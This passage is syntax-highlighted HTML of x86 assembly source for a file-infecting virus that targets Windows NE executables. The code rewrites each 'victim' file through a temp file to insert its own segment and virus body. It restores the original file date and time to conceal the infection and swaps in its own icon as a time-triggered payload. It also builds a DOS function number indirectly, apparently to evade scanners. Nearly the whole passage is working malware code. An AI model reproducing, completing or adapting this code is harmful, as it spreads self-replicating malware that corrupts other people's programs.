    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; copy old segment descriptor table</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_file_block</span><span class="sc0">         </span><span class="sc1">; to temporary file</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">copy_segment_table_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">copy_segment_table_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write our own segment descriptor</span><span class="sc0">
                    </span><span class="sc1">; to the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; size of a segment descriptor</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DX=offset of write buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS=segment of write bufer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">write_our_descriptor_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">write_our_descriptor_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">bp.first_segm_offs</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ECX=size of the rest of the</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">bp.offs_other_tbls</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; NE header tables</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_file_block</span><span class="sc0">         </span><span class="sc1">; copy them too</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                </span><span class="sc1">; move file pointer relative to</span><span class="sc0">
                    </span><span class="sc1">; current position</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.source_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX=handle of victim</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; CX:DX=8 (new file position)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; done to skip the padding space that</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; was overwritten with the new</span><span class="sc0">
                    </span><span class="sc1">; segment descriptor</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">skip_padding_bytes</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">skip_padding_bytes</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">          </span><span class="sc1">; whole file body</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_file_block</span><span class="sc0">         </span><span class="sc1">; copy the file body</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">copy_file_body_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">copy_file_body_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EAX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=aligned offset of our segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">32h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CL=alignment shift</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; EAX=offset of our segment in bytes</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; CX:DX=EAX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; go to our segment offset in file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=temp file handle</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">move_filepointer_to_our_segment_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">move_filepointer_to_our_segment_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write virus body to file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">org_entry</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; write whole virus body excluding</span><span class="sc0">
                    </span><span class="sc1">; the last dword (original host</span><span class="sc0">
                    </span><span class="sc1">; entry point, must be relocated</span><span class="sc0">
                    </span><span class="sc1">; and therefore initialised).</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">   </span><span class="sc1">; DX=offset write buffer=virus body</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">write_virus_body_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">write_virus_body_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write relocation stuff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">size_of_relocation_stuff</span><span class="sc0"> </span><span class="sc1">; size of relocation stuff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocation_stuff</span><span class="sc0">  </span><span class="sc1">; DX=offset write buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_tmp_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write original host entry point</span><span class="sc0">
                    </span><span class="sc1">; to our relocation item</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; CX=4 (size to write)</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; what for???</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.host_entry_cs</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DX=offset write buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS=segment write buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_tmp_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">                  </span><span class="sc1">; get time</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                   </span><span class="sc1">; between 00:00a and 00:15a ?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">              </span><span class="sc1">; if not, don't activate payload</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">search_icon_resource</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_payload</span><span class="sc0">              </span><span class="sc1">; on error, skip payload</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_icon</span><span class="sc0">              </span><span class="sc1">; give the file our own icon</span><span class="sc0">
</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close temp file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close victim file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.source_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX=victim file handle</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_filename</span><span class="sc0">  </span><span class="sc1">; DS:DX=pointer to temp file name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                </span><span class="sc1">; reopen temp file read-only</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">delete_tmp_file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.source_handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; save handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">                  </span><span class="sc1">; recreate victim file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; no attributes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.filename_ptr</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; DS:DX=ptr to full victim filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">delete_tmp_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; handle to BX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.dest_handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; save handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">          </span><span class="sc1">; copy the whole temp file over the</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_file_block</span><span class="sc0">         </span><span class="sc1">; victim file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">                </span><span class="sc1">; AX=5701h - set file date and time</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2701h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=handle of victim file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.file_date</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; CX=old file date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">bp.file_time</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; DX=old file time</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close victim file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.source_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX=handle of temp file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close temp file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_filename</span><span class="sc0">  </span><span class="sc1">; DS:DX=pointer to temp file name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                  </span><span class="sc1">; delete temp file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">; clear carry flag (indicate success)</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_infect</span><span class="sc0">

</span><span class="sc5">close_tmp_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=handle of temp file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close temp file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">delete_tmp_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_filename</span><span class="sc0">  </span><span class="sc1">; DS:DX=pointer to temp file name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                  </span><span class="sc1">; delete temp file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.source_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX=handle of victim file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close fictim file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; set carry flag (indicate error)</span><span class="sc0">

</span><span class="sc5">exit_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                           </span><span class="sc1">; Restore all regs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ----- GET DATE, TIME AND SIZE OF THE OPENED FILE --------------------------</span><span class="sc0">

</span><span class="sc5">get_file_date_time_size</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; save CX and DX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; get date and time</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.file_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; save date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.file_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; save time</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; CX:DX=0 (distance to move)</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">; move filepointer relative to</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; end of file</span><span class="sc0">
                    </span><span class="sc1">; in DX:AX the new filpointer is</span><span class="sc0">
                    </span><span class="sc1">; returned (filesize in this case)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.file_size</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; save filesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.file_size</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; DX:CX=0 (distance to move)</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; move filepointer relative to</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; beginning of file</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; restore DX and CX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ----- COPY ECX BYTES FROM VICTIM FILE TO TEMP FILE ------------------------</span><span class="sc0">

</span><span class="sc5">copy_file_block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                          </span><span class="sc1">; save all 32bit registers</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">                  </span><span class="sc1">; allocate a 256 byte buffer from stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.bytes_to_copy</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; save length of block to copy</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; DX=offset buffer</span><span class="sc0">

</span><span class="sc5">copy_file_block_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.bytes_to_copy</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; whole block moved?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_file_block_done</span><span class="sc0">    </span><span class="sc1">; then we're done</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.bytes_to_copy</span><span class="sc4">],</span><span class="sc2">256</span><span class="sc0">  </span><span class="sc1">; more than 256 bytes left?</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">copy_remaining_bytes_block</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">                  </span><span class="sc1">; then just copy 256 bytes</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_file_block</span><span class="sc0">

</span><span class="sc5">copy_remaining_bytes_block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.bytes_to_copy</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; copy all bytes left</span><span class="sc0">

</span><span class="sc5">read_file_block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; save size to read/write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.source_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX=handle of source file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read from file function</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=handle of destination file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; write as many bytes as were read</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write block to temporary file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; sizes of read block=written block ?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; restore size to read and write</span><span class="sc0">
